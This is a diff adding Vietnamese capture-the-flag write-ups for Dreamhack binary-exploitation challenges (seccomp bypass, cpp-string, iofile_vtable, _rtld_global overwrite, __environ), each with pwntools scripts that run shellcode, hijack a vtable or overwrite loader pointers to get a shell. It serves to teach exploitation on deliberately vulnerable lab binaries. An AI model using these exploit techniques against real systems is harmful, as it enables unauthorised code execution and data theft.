@@ -1,4 +1,237 @@
 <details>
+<summary>Bypass Seccomp-1 </summary>
+- Đề cho ta 1 file source, 1 file binary và 1 file docker.
+- Đầu tiên mở file source lên đọc thử : 
+
+![](https://i.imgur.com/uBynSs8.png)
+
+- Ta thấy chương trình cấp phát `0x1000` byte và sau đó chạy cái ta nhập, ngoài ra có hàm `sandbox` restrict syscall tới các hàm sau: open,execve,execveat,write
+    
+![](https://i.imgur.com/OVsocPa.png)
+
+- Sau một hồi tìm hiểu, ta nhận thấy ta sẽ sài `openat` thay thế cho `open`, sendfile thay thế cho `read` và `write`. 
+
+- Ta đọc manpage của `openat`. Ta thấy ta cần cung cấp ít nhất 3 arguments.
+    
+![](https://i.imgur.com/4I7WXsb.png)
+
+- Đọc file docker thì ta thấy tại đường dẫn của file binary có file tên `flag`. Do đó ta cần truyền arguments như sau : `(AT_FDCWD,"flag",0)`. Trong đó `AT_FDCWD` cho `openat` biết đây là địa chỉ tương đối, tức mở file tên flag ở địa chỉ file binary đang chạy và nó là hằng số có giá trị là -100.
+
+- Tiếp theo là `sendfile`, ta cần truyền arguments như sau `(1,fd,0,100)` tức in 100 byte từ file descriptor `fd` sang `stdout` bắt đầu từ vị trí 0.
+
+- Kế tiếp ta viết script:
+```python
+from pwn import *
+exe = ELF("bypass_syscall")
+#p = process(exe.path)
+p = remote("host2.dreamhack.games",13231)
+context.update(arch='amd64',os='linux')
+
+payload = asm(shellcraft.openat(-100,"flag",0))
+payload += asm(shellcraft.sendfile(1,'rax',0,100))
+#print(hexdump(payload))
+p.sendline(payload+b'\n')
+p.interactive()
+```
+- Ở đây file descriptor thay thế bằng `rax` vì khi chạy `openat` nó sẽ đưa `fd` vào `rax`
+</details>
+
+<details>
+<summary>cpp-string </summary>
+    
+- Bài cho ta một file source và 1 file binary
+- Đầu tiên ta mở file source lên xem
+    
+![](https://i.imgur.com/n2T1uTJ.png)
+
+- Ta nhận thấy chương trình hoạt động như sau: 
+nhấn 1 để load flag và đọc thông tin từ 1 file, nhấn 2 để ghi vào file đó. Nhấn 3 in ra `readbuffer`
+- Bài này nhìn qua thì hướng khai thác là leak được flag. Vậy ta sẽ phân tích thử các hàm được gọi, trong đó có 2 hàm `read_file` và `write_file` khá nghi ngờ.
+- Hàm `read_file` thì đọc 64 byte từ file `test` vào `readbuffer` , không có gì nguy hiểm cả
+    
+![](https://i.imgur.com/6aUCgEK.png)
+
+- Ngược lại hàm `write_file` nhập một string vào `writebuffer` sau đó lấy 64 byte trong string đó chuyển thành C-style string và ghi vào file test. Ở đây ta lưu ý cách biểu diễn sâu ở C và C++ khác nhau, C thì có null terminator ở cuối còn C++ implement bằng cách lưu độ dài sâu nhập. Do đó nếu ta nhập hơn 64 byte vào thì khi gọi hàm `read_file` thì `readbuffer` (khai báo kiểu string trong C) sẽ không có null terminator dẫn đến leak flag
+    
+![](https://i.imgur.com/3RdkEze.png)
+    
+- Vậy ta cần nhập quá 64 byte -> ghi vào `readbuffer` -> in flag
+- Test thử ý tưởng trên thì ta có flag
+    
+![](https://i.imgur.com/8hVPW7f.png)
+
+</details>
+
+<details>
+<summary>iofile_vtable </summary>
+    
+- Bài cho ta file source và 1 file binary
+- Đầu tiên ta mở file source lên đọc thử
+- Ta thấy có hàm `get_shell` và bài cho ta ghi vào `stderr+1` 8 byte
+- Vậy để biết `sttder+1` là gì, ở đâu thì ta debug.
+- Ta được output như sau : 
+    
+![](https://i.imgur.com/8xFGkxi.png)
+    
+- Để hiểu rõ hơn ở đâu ta coi thử `_IO_2_1_stderr_`
+    
+![](https://i.imgur.com/h9ASjas.png)
+
+- Ta nhận thấy ta được ghi vào địa chỉ `vtable`.
+- Sau một hồi research ta được như sau: vtable sẽ chứa một loạt các địa chỉ của các hàm được thực thi, ngoài ra còn có hàm `fwrite` khi disassembly ra sẽ có lệnh `call QWORD PTR [r15+0x38]`. Trong đó `r15` là địa chỉ của `vtable` mà ta được phép overwrite
+    
+![](https://i.imgur.com/2YGhtbN.png)
+
+![](https://i.imgur.com/TN2Dow1.png)
+
+- Xem kỹ lại chương trình thì ta thấy như sau: đề bắt ta nhập biến `name` gồm 8 byte. Ngoài ra không hề có hàm `fwrite`. Nhưng ta vào lại gdb thì thấy khi disass main ra thì lại có hàm fwrite. Vậy chắc khi compile thì hàm `fprintf` được implement bằng lower-level function như `fwrite`
+    
+![](https://i.imgur.com/dXBDzaK.png)
+
+- Tiếp theo ta `checksec` thì thấy NO PIE, do đó ta có thể lấy được địa chỉ hàm `get_shell` và địa chỉ biến `name`.
+    
+![](https://i.imgur.com/hQdPcu7.png)
+
+- Vậy ta có ý tưởng như sau: Nhập vào biến `name` địa chỉ của của hàm `get_shell` sau đó ghi vào vtable địa chỉ của biến `name-0x38`(để khi cộng lại ra đúng địa chỉ name) rồi nhập 2 để gọi hàm `fwrite` đã được trỏ tới hàm `get_shell`
+
+- Ta viết script thực hiện ý tưởng trên:
+```python
+from pwn import *
+exe = ELF("iofile_vtable")
+#p = process(exe.path)
+p = remote("host3.dreamhack.games",12716)
+'''
+gdb.attach(p,
+"""
+b* main + 228
+c
+""")
+input()
+'''
+p.sendlineafter(b'what is your name: ',p64(exe.sym['get_shell']))
+p.sendlineafter(b'> ',b'4')
+p.sendlineafter(b'change: ',p64(0x6010d0-0x38))
+p.sendlineafter(b'> ',b'2')
+p.interactive()
+```
+- Chạy thử và ta có được shell
+</details>
+
+<details>
+<summary>Overwrite _rtld_global</summary>
+
+- Bài cho ta file libc,fake flag,file source , file binary và file Docker
+- Đầu tiên ta mở source lên xem thử thì thấy giống bài rtld trước kia, ngoại trừ không có hàm `get_shell`
+    
+![](https://i.imgur.com/FBrTDUc.png)
+
+- Checksec thì thấy full giáp nên hướng khai thác vẫn là overwrite `_rtld_global`, hàm được gọi khi chương trình kết thúc.
+
+![](https://i.imgur.com/OXhLPAp.png)
+
+- Bài leak libc cho ta sẵn nên mình sẽ làm theo hướng overwrite `_rtld_global._dl_load_lock` thành "\bin\sh\x00" do đây là nơi chứa argument của hàm `_rtld_global._dl_rtld_lock_recursive` (hàm này OW thành `system`)
+
+- Vậy ta leak libc rồi tính offset như bình thường là được.
+- Script : 
+```python
+from pwn import *
+exe = ELF("ow_rtld_patched")
+libc = ELF("libc.so.6")
+
+#p = process(exe.path)
+p=remote("host3.dreamhack.games",17022)
+'''
+gdb.attach(p,
+"""
+b* main+198
+c
+""")
+input()
+'''
+p.recvuntil(b'stdout: ')
+leak = int(p.recvline()[:-1].decode(),16)
+libc.address = leak - 4114272
+print("leak = ",hex(libc.address))
+
+rtld_lock_recursive = libc.address + 6397792
+load_lock = libc.address + 6396264
+
+p.sendlineafter(b'> ',b'1')
+p.sendlineafter(b'addr: ',str(rtld_lock_recursive).encode())
+p.sendlineafter(b'data: ',str(libc.sym['system']).encode())
+
+p.sendlineafter(b'> ',b'1')
+p.sendlineafter(b'addr: ',str(load_lock).encode())
+p.sendlineafter(b'data: ',str(u64('/bin/sh\x00')))
+
+p.sendlineafter(b'> ',b'2')
+p.interactive()
+
+```
+- Chạy script trên và ta có được shell
+</details>
+
+<details>
+<summary>__environ</summary>
+
+- Bài cho ta file docker, file source, file binary.
+- Đầu tiên ta mở source lên xem thì thấy code sẽ leak libc cho ta và in strings của một địa chỉ bất kỳ
+
+![](https://i.imgur.com/qWV1UzK.png)
+
+- Ta cũng thấy code cũng load file flag vào stack cho ta. Do đó ở đây ta cần tìm ra địa chỉ stack. Theo dreamhack thì mình sẽ lợi dụng hàm `environ` vì hàm này chứa địa chỉ `stack`. Vậy khi ta in được địa chỉ này ra thì sẽ tính được offset tới flag để leak.
+
+- Tiếp theo ta thấy đề không cho ta file libc nên không thể sài libc của mình. Do đó mình kết nối tới server để tìm bản libc thích hợp
+
+![](https://i.imgur.com/wKs2PNn.png)
+
+- Ở đây ra một loạt libc. Do đó phải thử từng cái để biết cái nào là của server. Nhưng mình để ý thì thấy ở đây có phiên bản 2.27, tức trùng với file libc của bài `Overwrite _rtld_global` mới làm nên mình lấy nó test đầu tiên cho nhanh, không được tính tiếp.
+
+![](https://i.imgur.com/B1jAliW.png)
+
+- Vậy đầu tiên ta leak libc tính offset bình thường, sau đó tính offset của `environ` tới libc 
+    
+![](https://i.imgur.com/eg1eWIy.png)
+
+![](https://i.imgur.com/vTzVqff.png)
+
+- Sau đó tính offset stack leak được tới flag. 
+    
+![](https://i.imgur.com/4IiCClw.png)
+
+- Ở đây offset ban đầu ta tính ra sai, sau một hồi debug thì offset cần tìm là `5432`
+- Vậy cuối cùng ta viết script:
+```python
+from pwn import *
+exe = ELF("environ_exercise_patched")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+#p=remote("host3.dreamhack.games",11194)
+p = process(exe.path)
+gdb.attach(p,
+"""
+b*main+73
+c
+""")
+input()
+
+p.recvuntil(b'stdout: ')
+leak = int(p.recvline()[:-1].decode(),16)
+libc.address = leak -4114272
+print("leak = ",hex(libc.address))
+
+p.sendlineafter(b'> ',b'1')
+p.sendlineafter(b'Addr: ',str(libc.address + 0x3ee098 ))
+stack = u64(p.recvn(6) + b'\x00\x00')
+
+print('stack: ',hex(stack))
+p.sendlineafter(b'> ',b'1')
+p.sendlineafter(b'Addr: ',str(stack-5432))
+p.interactive()
+```
+- Chạy script trên ta sẽ có được shell.
+</details>
+
+<details>
 <summary>memory_leakage </summary>
 	
 - Bài cho ta 1 file source và 1 file binary
